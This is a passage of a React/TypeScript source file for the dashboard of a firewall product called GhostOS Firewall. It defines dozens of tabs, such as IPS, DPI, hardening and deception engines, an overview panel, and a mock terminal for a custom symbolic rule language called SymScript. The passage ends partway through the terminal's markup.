// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// GhostOS™ Firewall — ProxhqVPN Next-Generation Firewall System
import React, { useState, useRef, useEffect, useCallback } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";
import { AttackerIntelPanel as AttackerIntelPanelFw } from "@/components/AttackerIntelPanel";
import { useLocation } from "wouter";
import {
  Shield, Terminal, AlertTriangle, Globe2, Rss, Layers, Link2,
  Ban, BarChart3, Download, Trash2, RefreshCw, Zap, Eye,
  Play, Plus, Search, Copy, Check, FlaskConical, ChevronDown, ChevronRight,
  Tag, Clock, ArrowLeftRight, Gauge, Network, ScanLine, Fingerprint,
  Server, BellOff, FileJson, Filter,
  // Next-gen 2024-2025 icons
  Cpu, Lock, Wifi, GitBranch, Package, Bot, Map, Activity,
  // Military + Spybot icons
  ShieldCheck, Key, HardDrive, Radio, Monitor, Bug, FileX, Microscope, BookOpen, Database,
  // Three-layer honeypot loop icons
  Infinity, Hourglass, Layers as LayersIcon, CircleDot, RotateCcw, ArrowRight, Crosshair,
  Timer, Waves, MousePointerClick, ExternalLink,
} from "lucide-react";
import {
  useListGhostOsRules, useCreateGhostOsRule, useDeleteGhostOsRule, useUpdateGhostOsRule,
  useTranscribeToSymscript, useParseGhostOsRule,
  useListIpsSignatures, useToggleIpsSignature, useBulkToggleIpsCategory, useDeleteIpsSignature,
  useListDpiRules, useCreateDpiRule, useDeleteDpiRule, useUpdateDpiRule, useTestDpiPattern,
  useListGeoBlocks, useAddGeoBlock, useRemoveGeoBlock, useUpdateGeoBlock,
  useListThreatFeeds, useSyncThreatFeed, useUpdateThreatFeed,
  useListFirewallZones, useCreateFirewallZone, useDeleteFirewallZone, useUpdateFirewallZone,
  useListFqdnRules, useCreateFqdnRule, useDeleteFqdnRule, useUpdateFqdnRule,
  useGetFirewallAnalytics, useListThreatProfiles, useApplyThreatProfile,
  useCheckRuleConflicts,
  useGetFirewallStatus, useToggleFirewall,
  useListFirewallRules, useCreateFirewallRule, useDeleteFirewallRule, useUpdateFirewallRule,
  useListBlockedIps, useBlockIp, useUnblockIp, useGenerateIptablesRules,
} from "@workspace/api-client-react";

const TAB_ICONS: Record<string, React.ReactNode> = {
  overview: <Shield size={13} />, ghostos: <Terminal size={13} />, ips: <AlertTriangle size={13} />,
  dpi: <Eye size={13} />, threat: <Globe2 size={13} />, zones: <Layers size={13} />,
  rules: <Link2 size={13} />, blacklist: <Ban size={13} />, analytics: <BarChart3 size={13} />, export: <Download size={13} />,
  analyzer: <FlaskConical size={13} />,
  // New gap-filling features (pfSense / OPNsense / IPFire / Snort / Suricata)
  aliases:     <Tag size={13} />,
  schedules:   <Clock size={13} />,
  nat:         <ArrowLeftRight size={13} />,
  qos:         <Gauge size={13} />,
  wan:         <Network size={13} />,
  stateTable:  <Rss size={13} />,
  portscans:   <ScanLine size={13} />,
  tls:         <Fingerprint size={13} />,
  dnsMonitor:  <Server size={13} />,
  suppressions:<BellOff size={13} />,
  eveExport:   <FileJson size={13} />,
  proxy:       <Filter size={13} />,
  // ── 2024-2025 Next-Gen Research ──
  ebpf:        <Cpu size={13} />,
  quic:        <Zap size={13} />,
  eta:         <Activity size={13} />,
  ech:         <Lock size={13} />,
  doh:         <Wifi size={13} />,
  lateral:     <GitBranch size={13} />,
  netflow:     <BarChart3 size={13} />,
  supplychain: <Package size={13} />,
  airules:     <Bot size={13} />,
  rpki:        <Globe2 size={13} />,
  deception:   <Eye size={13} />,
  geoip:       <Map size={13} />,
  // ── Quarantine Engine ──
  quarantine:  <FileX size={13} />,
  // ── Military-Grade (NSA/DARPA/SELinux) ──
  selinux:     <ShieldCheck size={13} />,
  apparmor:    <Lock size={13} />,
  sbom:        <Database size={13} />,
  auditd:      <Microscope size={13} />,
  nftables:    <HardDrive size={13} />,
  kernelharden:<ShieldCheck size={13} />,
  mls:         <BookOpen size={13} />,
  zerotrust:   <Key size={13} />,
  // ── Spybot-Inspired ──
  hostsimm:    <Server size={13} />,
  tracking:    <Radio size={13} />,
  telemetry:   <Radio size={13} />,
  startup:     <Monitor size={13} />,
  rootkit:     <Bug size={13} />,
  shredder:    <FileX size={13} />,
  pup:         <Package size={13} />,
  registry:    <Key size={13} />,
  // ── ProxhqAV Antivirus Engine ──
  avengine:    <ShieldCheck size={13} />,
  iocdb:       <Database size={13} />,
  yaraengine:  <Search size={13} />,
  // ── Three-Layer Honeypot Loop ──
  looptrap:    <Infinity size={13} />,
  labyrinth:   <GitBranch size={13} />,
  tarpit:      <Hourglass size={13} />,
  nodesync:    <Server size={13} />,
  // ── 5 New Firewall Enhancements ──
  atr:         <Zap size={13} />,
  peerrules:   <Key size={13} />,
  ddos:        <Activity size={13} />,
  optimizer:   <Bot size={13} />,
  riskscore:   <BarChart3 size={13} />,
  myrules:     <ShieldCheck size={13} />,
};
const TABS = [
  { id:"overview", label:"Overview" }, { id:"ghostos", label:"GhostOS™" }, { id:"ips", label:"IPS Engine" },
  { id:"dpi", label:"DPI Engine" }, { id:"threat", label:"Threat Intel" }, { id:"zones", label:"Zones" },
  { id:"rules", label:"Rules" }, { id:"blacklist", label:"Blacklist" }, { id:"analytics", label:"Analytics" }, { id:"export", label:"Export" },
  { id:"analyzer", label:"Payload Analyzer" },
  // ── Gap features (pfSense/OPNsense/IPFire/Snort/Suricata) ─────────────────
  { id:"aliases",     label:"Aliases" },
  { id:"schedules",   label:"Schedules" },
  { id:"nat",         label:"NAT/Forward" },
  { id:"qos",         label:"QoS/Shaping" },
  { id:"wan",         label:"WAN Groups" },
  { id:"stateTable",  label:"State Table" },
  { id:"portscans",   label:"Portscan Det." },
  { id:"tls",         label:"JA3/TLS Intel" },
  { id:"dnsMonitor",  label:"DNS Monitor" },
  { id:"suppressions",label:"Suppressions" },
  { id:"eveExport",   label:"EVE Export" },
  { id:"proxy",       label:"Web Proxy" },
  // ── 2024-2025 Next-Gen Research ─────────────────────────────────────────
  { id:"ebpf",        label:"eBPF/XDP" },
  { id:"quic",        label:"QUIC/HTTP3" },
  { id:"eta",         label:"Traffic ETA" },
  { id:"ech",         label:"ECH Policy" },
  { id:"doh",         label:"DoH/DoT" },
  { id:"lateral",     label:"Lateral Mvmt" },
  { id:"netflow",     label:"NetFlow" },
  { id:"supplychain", label:"Supply Chain" },
  { id:"airules",     label:"AI Rules" },
  { id:"rpki",        label:"RPKI/BGP" },
  { id:"deception",   label:"Deception" },
  { id:"geoip",       label:"Geo-IP" },
  // ── Quarantine Engine ────────────────────────────────────────────────────
  { id:"quarantine",  label:"File Quarantine" },
  // ── Military-Grade (NSA/DARPA research) ──────────────────────────────────
  { id:"selinux",     label:"SELinux MAC" },
  { id:"apparmor",    label:"AppArmor" },
  { id:"sbom",        label:"SBOM/CVE" },
  { id:"auditd",      label:"auditd" },
  { id:"nftables",    label:"nftables" },
  { id:"kernelharden",label:"Kernel Harden" },
  { id:"mls",         label:"MLS/Bell-LaPadula" },
  { id:"zerotrust",   label:"Zero Trust Seg" },
  // ── Spybot Search & Destroy inspired ─────────────────────────────────────
  { id:"hostsimm",    label:"Hosts Immunizer" },
  { id:"tracking",    label:"Tracking Blocker" },
  { id:"telemetry",   label:"Anti-Telemetry" },
  { id:"startup",     label:"Startup Auditor" },
  { id:"rootkit",     label:"Rootkit Scanner" },
  { id:"shredder",    label:"Secure Shredder" },
  { id:"pup",         label:"PUP Database" },
  { id:"registry",    label:"Registry Monitor" },
  // ── ProxhqAV Antivirus Engine ────────────────────────────────────────────
  { id:"avengine",    label:"ProxhqAV Engine" },
  { id:"iocdb",       label:"IOC Database" },
  { id:"yaraengine",  label:"YARA Engine" },
  // ── Three-Layer Honeypot Loop ────────────────────────────────────────────
  { id:"looptrap",    label:"Endless Loop Engine™" },
  { id:"labyrinth",   label:"Labyrinth Engine™" },
  { id:"tarpit",      label:"Tar Pit Drain™" },
  // ── Enforcement Plane ────────────────────────────────────────────────────
  { id:"nodesync",    label:"🟢 Node Sync" },
  // ── New Firewall Enhancements ────────────────────────────────────────────
  { id:"atr",         label:"⚡ Auto-Response" },
  { id:"peerrules",   label:"🔑 Peer Rules" },
  { id:"ddos",        label:"🛡 DDoS Shield" },
  { id:"optimizer",   label:"🤖 AI Optimizer" },
  { id:"riskscore",   label:"📊 Risk Score" },
  { id:"myrules",    label:"🔐 My Rules" },
];
const SEV_COLOR: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff", info:"#888" };
const TRUST_COLOR: Record<string,string> = { trusted:"#00ff88", untrusted:"#ff4444", dmz:"#ff9900", management:"#4488ff" };

// ── Tab Error Boundary — prevents one broken tab from crashing the whole page ──
class TabErrorBoundary extends React.Component<
  { children: React.ReactNode; tabName: string },
  { error: Error | null }
> {
  constructor(props: { children: React.ReactNode; tabName: string }) {
    super(props);
    this.state = { error: null };
  }
  static getDerivedStateFromError(error: Error) { return { error }; }
  render() {
    if (this.state.error) {
      return (
        <div style={{ padding:40, background:"#0a0a0a", border:"1px solid #ff444433", borderRadius:10, textAlign:"center", marginTop:24 }}>
          <div style={{ fontSize:36, marginBottom:16 }}>⚠️</div>
          <div style={{ color:"#ff4444", fontFamily:"monospace", fontSize:15, fontWeight:700, marginBottom:10 }}>
            This section hit an error
          </div>
          <div style={{ color:"#555", fontSize:11, fontFamily:"monospace", marginBottom:20, maxWidth:480, margin:"0 auto 20px", wordBreak:"break-word" }}>
            {this.state.error.message}
          </div>
          <div style={{ color:"#333", fontSize:10, marginBottom:20 }}>
            The rest of the firewall is still working. Use the left menu to navigate elsewhere.
          </div>
          <button
            onClick={() => this.setState({ error: null })}
            style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:6, padding:"9px 22px", cursor:"pointer", fontSize:12, fontFamily:"monospace" }}
          >
            ↺ Try Again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// ── Tab Groups — organises 60+ tabs into 10 logical categories ──
const TAB_GROUPS: Record<string, {
  icon: string;
  label: string;
  tabs: Array<{ id: string; label: string; desc: string }>;
}> = {
  core: {
    icon: "🛡",
    label: "Core Protection",
    tabs: [
      { id:"overview",     label:"Overview",             desc:"Status dashboard & threat level" },
      { id:"ghostos",      label:"GhostOS™ Terminal",    desc:"Proprietary SymScript™ rule editor" },
      { id:"rules",        label:"Firewall Rules",       desc:"Allow, deny, drop & reject policies" },
      { id:"blacklist",    label:"Blocked IPs",          desc:"Manual & auto-blocked IP addresses" },
      { id:"atr",          label:"Auto-Response",        desc:"Automated threat counter-action" },
      { id:"ddos",         label:"DDoS Shield",          desc:"Volumetric attack mitigation" },
    ],
  },
  traffic: {
    icon: "🔍",
    label: "Traffic Inspection",
    tabs: [
      { id:"ips",          label:"IPS Engine",           desc:"Intrusion prevention signatures (Snort/Suricata)" },
      { id:"dpi",          label:"DPI Engine",           desc:"Deep packet inspection rules" },
      { id:"analyzer",     label:"Payload Analyzer",     desc:"Manually scan & test payloads" },
      { id:"threat",       label:"Threat Intel",         desc:"IP reputation & external threat feeds" },
      { id:"airules",      label:"AI Rule Builder",      desc:"Describe a rule in plain English" },
      { id:"riskscore",    label:"Risk Score",           desc:"Per-source threat scoring" },
    ],
  },
  network: {
    icon: "🌐",
    label: "Network Config",
    tabs: [
      { id:"nat",          label:"NAT / Forwarding",     desc:"Port forwarding & address masquerade" },
      { id:"zones",        label:"Network Zones",        desc:"Trusted, DMZ & untrusted segments" },
      { id:"qos",          label:"QoS / Shaping",        desc:"Bandwidth limits & traffic prioritisation" },
      { id:"wan",          label:"WAN Groups",           desc:"Multi-WAN load balancing" },
      { id:"geoip",        label:"Geo-IP Blocking",      desc:"Block or allow entire countries" },
      { id:"rpki",         label:"RPKI / BGP",           desc:"Route origin validation" },
      { id:"aliases",      label:"Aliases",              desc:"Named IP/network/port groups" },
      { id:"schedules",    label:"Schedules",            desc:"Time-activated rule windows" },
    ],
  },
  monitoring: {
    icon: "📊",
    label: "Monitoring",
    tabs: [
      { id:"analytics",    label:"Analytics",            desc:"Traffic charts & top threat stats" },
      { id:"stateTable",   label:"Connection Table",     desc:"Live connection & state view" },
      { id:"portscans",    label:"Portscan Detect",      desc:"Automated port scan detection" },
      { id:"tls",          label:"JA3 / TLS Intel",      desc:"TLS fingerprint matching (C2 detection)" },
      { id:"dnsMonitor",   label:"DNS Monitor",          desc:"DGA malware & DNS tunneling detection" },
      { id:"netflow",      label:"NetFlow",              desc:"Traffic flow export" },
      { id:"eveExport",    label:"EVE Export",           desc:"Suricata-format event export" },
      { id:"export",       label:"Export / Import",      desc:"Backup & restore all rules" },
    ],
  },
  intelligence: {
    icon: "🦠",
    label: "Threat Intelligence",
    tabs: [
      { id:"avengine",     label:"ProxhqAV Engine",      desc:"Real-time antivirus scanning" },
      { id:"iocdb",        label:"IOC Database",         desc:"Indicators of compromise library" },
      { id:"yaraengine",   label:"YARA Engine",          desc:"Custom pattern-matching rules" },
      { id:"supplychain",  label:"Supply Chain Guard",   desc:"Software updater monitoring" },
    ],
  },
  protocol: {
    icon: "🔌",
    label: "Protocol Analysis",
    tabs: [
      { id:"quic",         label:"QUIC / HTTP3",         desc:"QUIC protocol analysis & blocking" },
      { id:"ech",          label:"ECH Policy",           desc:"Encrypted Client Hello handling" },
      { id:"doh",          label:"DoH / DoT",            desc:"DNS-over-HTTPS/TLS control" },
      { id:"ebpf",         label:"eBPF / XDP",           desc:"Kernel-level packet filtering" },
      { id:"eta",          label:"Traffic ETA",          desc:"Encrypted traffic analysis" },
      { id:"proxy",        label:"Web Proxy Rules",      desc:"HTTP proxy & content filtering" },
      { id:"suppressions", label:"Suppressions",         desc:"Silence specific alert rules" },
    ],
  },
  hardening: {
    icon: "🔒",
    label: "System Hardening",
    tabs: [
      { id:"selinux",      label:"SELinux MAC",          desc:"NSA mandatory access control (enforcing)" },
      { id:"apparmor",     label:"AppArmor",             desc:"Application confinement profiles" },
      { id:"nftables",     label:"nftables",             desc:"Linux kernel packet filtering tables" },
      { id:"kernelharden", label:"Kernel Hardening",     desc:"Sysctl parameters & kernel lockdown" },
      { id:"mls",          label:"MLS / Bell-LaPadula",  desc:"Military multi-level security model" },
      { id:"zerotrust",    label:"Zero Trust Seg.",      desc:"Micro-segmentation access policies" },
      { id:"sbom",         label:"SBOM / CVE",           desc:"Software bill of materials & CVE scan" },
      { id:"auditd",       label:"auditd",               desc:"Linux kernel audit daemon" },
    ],
  },
  endpoint: {
    icon: "🖥️",
    label: "Endpoint Security",
    tabs: [
      { id:"quarantine",   label:"File Quarantine",      desc:"Isolated threat containment vault" },
      { id:"hostsimm",     label:"Hosts Immunizer",      desc:"System hosts-file malware blocking" },
      { id:"tracking",     label:"Tracking Blocker",     desc:"Ad network & tracker blocking" },
      { id:"telemetry",    label:"Anti-Telemetry",       desc:"Block spyware phone-home calls" },
      { id:"startup",      label:"Startup Auditor",      desc:"Autorun & persistence entry audit" },
      { id:"rootkit",      label:"Rootkit Scanner",      desc:"Hidden process & kernel rootkit scan" },
      { id:"shredder",     label:"Secure Shredder",      desc:"Forensic-grade file deletion" },
      { id:"pup",          label:"PUP Database",         desc:"Potentially unwanted programs list" },
      { id:"registry",     label:"Registry Monitor",     desc:"Windows registry change protection" },
    ],
  },
  deception: {
    icon: "🎭",
    label: "Deception Engines",
    tabs: [
      { id:"looptrap",     label:"Endless Loop Engine™", desc:"Exhaust attacker CPU with infinite loops" },
      { id:"labyrinth",    label:"Labyrinth Engine™",    desc:"Trap attackers in redirect mazes" },
      { id:"tarpit",       label:"Tar Pit Drain™",       desc:"Slow-drip attackers to drain bandwidth" },
      { id:"deception",    label:"Deception Layer",      desc:"Fake services & honeypot traps" },
      { id:"lateral",      label:"Lateral Movement",     desc:"East-west attack path detection" },
    ],
  },
  access: {
    icon: "🔑",
    label: "Access & Control",
    tabs: [
      { id:"myrules",      label:"My Persistent Rules",  desc:"Your personal rules — survive restart & logoff" },
      { id:"peerrules",    label:"Peer Rules",           desc:"WireGuard peer-level firewall rules" },
      { id:"optimizer",    label:"AI Optimizer",         desc:"Automated rule de-duplication & cleanup" },
      { id:"nodesync",     label:"Node Sync",            desc:"Push rules to all 60 mesh nodes" },
    ],
  },
};

function Bdg({ label, color, sm }: { label: string; color?: string; sm?: boolean }) {
  const c = color ?? "#00ff88";
  return <span style={{ background: c+"22", color: c, border:`1px solid ${c}44`, borderRadius:4, padding: sm?"1px 6px":"2px 8px", fontSize: sm?10:11, fontFamily:"monospace", fontWeight:700, letterSpacing:1, textTransform:"uppercase" }}>{label}</span>;
}
function CopyBtn({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return <button onClick={() => { navigator.clipboard.writeText(text); setOk(true); setTimeout(()=>setOk(false),1500); }} style={{ background:"none", border:"none", cursor:"pointer", color: ok?"#00ff88":"#555", padding:0, marginLeft:4 }}>{ok?<Check size={11}/>:<Copy size={11}/>}</button>;
}

// ── Overview ─────────────────────────────────────────────────────────────
function OverviewTab() {
  const { data: st } = useGetFirewallStatus();
  const { data: an } = useGetFirewallAnalytics();
  const tog = useToggleFirewall();
  const tl = an?.threatLevel ?? "safe";
  const tlC = tl==="critical"?"#ff2244":tl==="high"?"#ff6600":tl==="medium"?"#ffaa00":tl==="low"?"#aaccff":"#00ff88";
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16 }}>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, gridColumn:"1/-1" }}>
        <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:16 }}>
          <div style={{ display:"flex", alignItems:"center", gap:10 }}>
            <Shield size={18} color="#00ff88" />
            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:14 }}>GhostOS™ Firewall — ProxhqVPN NGFW</span>
            <Bdg label={st?.mode?.toUpperCase()??"STEALTH"} color="#00ff88" sm />
            <Bdg label={st?.enabled?"ARMED":"OFFLINE"} color={st?.enabled?"#00ff88":"#ff4444"} sm />
          </div>
          <button onClick={()=>tog.mutate({data:{ enabled:!st?.enabled }})} style={{ background: st?.enabled?"#ff444422":"#00ff8822", border:`1px solid ${st?.enabled?"#ff444444":"#00ff8844"}`, color: st?.enabled?"#ff4444":"#00ff88", borderRadius:6, padding:"6px 14px", cursor:"pointer", fontFamily:"monospace", fontSize:12 }}>
            {st?.enabled?"Disarm Firewall":"Arm Firewall"}
          </button>
        </div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(6,1fr)", gap:10 }}>
          {[{l:"Rules",v:st?.totalRules??0,c:"#00ff88"},{l:"Blocked IPs",v:st?.blockedIps??0,c:"#ff4444"},{l:"IPS Sigs",v:st?.ipsSignatures??0,c:"#ff9900"},{l:"GhostOS Rules",v:st?.ghostOsRules??0,c:"#cc44ff"},{l:"Pkts Blocked",v:st?.packetsBlocked??0,c:"#ff6600"},{l:"Pkts Allowed",v:st?.packetsAllowed??0,c:"#44aaff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"12px 6px" }}>
              <div style={{ fontSize:22, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v.toLocaleString()}</div>
              <div style={{ fontSize:10, color:"#555", marginTop:2 }}>{s.l}</div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:`1px solid ${tlC}44`, borderRadius:8, padding:20 }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:8, textTransform:"uppercase", letterSpacing:1 }}>Threat Level</div>
        <div style={{ fontSize:40, fontWeight:900, color:tlC, fontFamily:"monospace", letterSpacing:4, textTransform:"uppercase" }}>{tl}</div>
        <div style={{ fontSize:11, color:"#444", marginTop:8 }}>{an?.totalBlocked24h??0} blocked · {an?.totalIpsHits24h??0} IPS hits</div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20 }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:12, textTransform:"uppercase", letterSpacing:1 }}>Recent Blocks</div>
        {(an?.recentBlocks??[]).length===0?<div style={{color:"#00ff88",fontFamily:"monospace",fontSize:12}}>✓ No recent blocks</div>:(an?.recentBlocks??[]).slice(0,5).map((b:{ip?:string;reason?:string},i:number)=>(
          <div key={i} style={{ display:"flex", justifyContent:"space-between", fontSize:12, marginBottom:6 }}>
            <span style={{ fontFamily:"monospace", color:"#ff4444" }}>{b.ip}</span>
            <span style={{ color:"#444", fontSize:11 }}>{(b.reason??"").substring(0,28)}</span>
          </div>
        ))}
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, gridColumn:"1/-1" }}>
        <div style={{ fontSize:11, color:"#555", marginBottom:12, textTransform:"uppercase", letterSpacing:1 }}>IPS Engine — Category Status</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {(an?.ipsCategoryBreakdown??[]).map((cat:{category?:string;enabled?:number;total?:number;hits?:number})=>(
            <div key={cat.category} style={{ background:"#111", borderRadius:6, padding:"10px 14px", display:"flex", justifyContent:"space-between", alignItems:"center" }}>
              <div>
                <div style={{ fontSize:11, fontFamily:"monospace", color:"#bbb", textTransform:"uppercase" }}>{cat.category}</div>
                <div style={{ fontSize:10, color:"#444" }}>{cat.enabled}/{cat.total} enabled</div>
              </div>
              <div style={{ fontSize:18, fontWeight:700, color:(cat.hits??0)>0?"#ff6600":"#2a2a2a", fontFamily:"monospace" }}>{cat.hits}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── GhostOS™ Terminal ─────────────────────────────────────────────────────
function GhostOsTab() {
  const [input, setInput] = useState("");
  const [hist, setHist] = useState<Array<{type:"i"|"o"|"e"|"s";text:string}>>([
    {type:"o",text:"GhostOS™ ProxhqVPN Firewall OS v1.0 — © 2026 Alpha Unlimited Technologies LLC"},
    {type:"o",text:"SymScript™ Language Engine loaded. 47 IPS signatures active."},
    {type:"o",text:"Type 'help' for command reference. All commands are proprietary — unknown to attack tools."},
    {type:"o",text:""},
  ]);
  const [cmdHist, setCmdHist] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);
  const [trInput, setTrInput] = useState("");
  const [trResult, setTrResult] = useState<{symscript?:string;explanation?:string;confidence?:number;compiledIptables?:string}|null>(null);
  const [newRule, setNewRule] = useState("");
  const termRef = useRef<HTMLDivElement>(null);
  const { data: rules, refetch } = useListGhostOsRules();
  const create = useCreateGhostOsRule();
  const del = useDeleteGhostOsRule();
  const upd = useUpdateGhostOsRule();
  const transcribe = useTranscribeToSymscript();
  const parse = useParseGhostOsRule();

  useEffect(()=>{ if(termRef.current) termRef.current.scrollTop=termRef.current.scrollHeight; },[hist]);
  const add = (type:"i"|"o"|"e"|"s", text:string) => setHist(h=>[...h,{type,text}]);

  const run = async (cmd:string) => {
    const c = cmd.trim(); if(!c) return;
    setCmdHist(h=>[c,...h.slice(0,49)]); setHistIdx(-1);
    add("i",`ghost@proxhqos:~$ ${c}`);
    if(c==="help"){
      add("o","═══ SymScript™ Commands ═══");
      add("o","  list              — list all active GhostOS™ rules");
      add("o","  add <rule>        — add a new SymScript™ rule");
      add("o","  del <id>          — delete rule by ID");
      add("o","  enable/disable <id> — toggle rule");
      add("o","  parse <rule>      — parse and explain a SymScript™ expression");
      add("o","  spec              — show SymScript™ language specification");
      add("o","  clear             — clear terminal");
      add("o","");
      add("o","═══ SymScript™ Verb Reference ═══");
      add("o","  ⊕ PERMIT   ⊘ DROP   ⊗ REJECT   ⊛ RATE-LIMIT   ⊜ INSPECT   ⊝ LOG+ALLOW   ⊞ LOG+BLOCK");
      add("o","");
      add("o","═══ Protocol Tokens ═══");
      add("o","  ΩT=TCP  ΩU=UDP  ΩI=ICMP  Ω6T=TCPv6  Ω*=ANY");
      add("o","");
      add("o","═══ Direction Operators ═══");
      add("o","  ← INBOUND   → OUTBOUND   ↔ BIDIRECTIONAL");
      add("o","");
      add("o","═══ Example SymScript™ Rules ═══");
      add("o","  ⊕ 51820::ΩU ← @ANY ≫1        # Allow WireGuard inbound, priority 1");
      add("o","  ⊕ 443::ΩT ← @ANY ≫5           # Allow HTTPS inbound");
      add("o","  ⊘ @GEO:KP ↔ @ANY ≫80          # Block North Korea (all traffic)");
      add("o","  ⊛ 22::ΩT ← @ANY ⚡5/min ≫50   # Rate-limit SSH brute force");
      add("o","  ⊞ ← @ANY ≫98                   # Log + block all unmatched inbound");
      add("o","  ⊥ ← ⊘                           # Default deny all inbound");
    } else if(c==="list"){
      const r=rules?.rules??[]; if(!r.length){add("o","No rules configured.");return;}
      add("o"," ID  ON   RULE");
      r.forEach(rule=>add("o",` ${String(rule.id).padStart(2)}  ${rule.enabled?"✓":"✗"}   ${rule.symbolicRule}  ${rule.description?`# ${rule.description}`:""}`));
    } else if(c.startsWith("add ")){
      const sym=c.slice(4).trim();
      try { await create.mutateAsync({data:{symbolicRule:sym}}); await refetch(); add("s",`✓ Rule added: ${sym}`); }
      catch(e:unknown){add("e",`✗ ${e instanceof Error?e.message:"Failed to add rule"}`);}
    } else if(c.startsWith("del ")){
      try { await del.mutateAsync({id:parseInt(c.slice(4))}); await refetch(); add("s","✓ Rule deleted"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("enable ")){
      try { await upd.mutateAsync({id:parseInt(c.slice(7)),data:{enabled:true}}); await refetch(); add("s","✓ Enabled"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("disable ")){
      try { await upd.mutateAsync({id:parseInt(c.slice(8)),data:{enabled:false}}); await refetch(); add("s","✓ Disabled"); }
      catch{add("e","✗ Failed");}
    } else if(c.startsWith("parse ")){
      try {
        const r=await parse.mutateAsync({data:{rule:c.slice(6).trim()}});
        if(r.valid){
          add("s","✓ Valid SymScript™");
          const p=r.parsed as Record<string,unknown>;
          add("o",`  Verb:      ${p?.verbLabel}`);
          add("o",`  Protocol:  ${p?.protocolLabel}${p?.port?":"+p.port:""}`);
          add("o",`  Direction: ${p?.dirLabel}`);
          add("o",`  Source:    ${p?.source??'@ANY'}`);
          add("o",`  iptables:  ${r.compiledIptables}`);
        } else add("e",`✗ ${r.error}`);
      } catch{add("e","✗ Parse failed");}
    } else if(c==="spec"){
      add("o","SymScript™ v1.0 — GhostOS™ ProxhqOS Firewall Language");
      add("o","Verbs:     ⊕ ⊘ ⊗ ⊛ ⊜ ⊝ ⊞");
      add("o","Protocols: ΩT(TCP) ΩU(UDP) ΩI(ICMP) Ω6T(TCPv6) Ω6U(UDPv6) Ω*(ANY)");
      add("o","Direction: ←(in) →(out) ↔(both)");
      add("o","Sources:   @IP @CIDR @GEO:XX @ANY");
      add("o","Zones:     ⟦I⟧(inner) ⟦O⟧(outer) ⟦D⟧(dmz) ⟦M⟧(mgmt) ⟦WG⟧ ⟦TOR⟧");
      add("o","Priority:  ≫N  (lower = higher priority)");
      add("o","Rate Limit: ⚡N/s  ⚡N/min  ⚡N/hr");
      add("o","Default:   ⊥ ← ⊘  (fallthrough deny inbound)");
    } else if(c==="clear"){
      setHist([{type:"o",text:"GhostOS™ terminal cleared."}]);
    } else {
      add("e",`✗ Unknown command: '${c}'. Type 'help'.`);
    }
    setInput("");
  };

  const handleTranscribe = async () => {
    if(!trInput.trim()) return;
    try { const r=await transcribe.mutateAsync({data:{input:trInput,format:"english"}}); setTrResult(r); }
    catch{}
  };
  const applyTranscribed = async () => {
    if(!trResult?.symscript) return;
    try { await create.mutateAsync({data:{symbolicRule:trResult.symscript,description:`Transcribed: ${trInput}`}}); await refetch(); add("s",`✓ Applied: ${trResult.symscript}`); setTrResult(null); setTrInput(""); }
    catch{}
  };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 295px", gap:16, height:680 }}>
      <div style={{ display:"flex", flexDirection:"column", gap:0 }}>
        {/* Terminal chrome */}
        <div style={{ background:"#0d0d0d", border:"1px solid #1a1a1a", borderBottom:"none", borderRadius:"8px 8px 0 0", padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          {["#ff4444","#ffaa00","#00ff88"].map(c=><div key={c} style={{width:9,height:9,borderRadius:"50%",background:c}}/>)}
          <span style={{ color:"#444", fontSize:11, fontFamily:"monospace", marginLeft:8 }}>GhostOS™ SymScript™ Terminal — PROXHQOS/1.0</span>
        </div>
        <div ref={termRef} style={{ flex:1, background:"#060606", border:"1px solid #1a1a1a", overflow:"auto", padding:14, fontFamily:"monospace", fontSize:12, lineHeight:1.65, minHeight:260 }}>
          {hist.map((l,i)=>(
            <div key={i} style={{ color: l.type==="i"?"#44aaff":l.type==="e"?"#ff4444":l.type==="s"?"#00ff88":"#666", whiteSpace:"pre-wrap" }}>{l.text}</div>
          ))}
        </div>
        <div style={{ background:"#0d0d0d", border:"1px solid #1a1a1a", borderTop:"1px solid #222", borderRadius:"0 0 8px 8px", padding:"8px 14px", display:"flex", alignItems:"center", gap:8 }}>
          <span style={{ color:"#00ff88", fontFamily:"monospace", fontSize:12, whiteSpace:"nowrap" }}>ghost@proxhqos:~$</span>
          <input style={{ flex:1, background:"transparent", border:"none", outline:"none", color:"#44aaff", fontFamily:"monospace", fontSize:12 }} value={input} onChange={e=>setInput(e.target.value)}
            onKeyDown={e=>{ if(e.key==="Enter") run(input); else if(e.key==="ArrowUp"){const n=Math.min(histIdx+1,cmdHist.length-1);setHistIdx(n);setInput(cmdHist[n]??"");} else if(e.key==="ArrowDown"){const n=Math.max(histIdx-1,-1);setHistIdx(n);setInput(n===-1?"":cmdHist[n]??"");} }}
            placeholder="Enter SymScript™ command or type 'help'..." autoFocus />
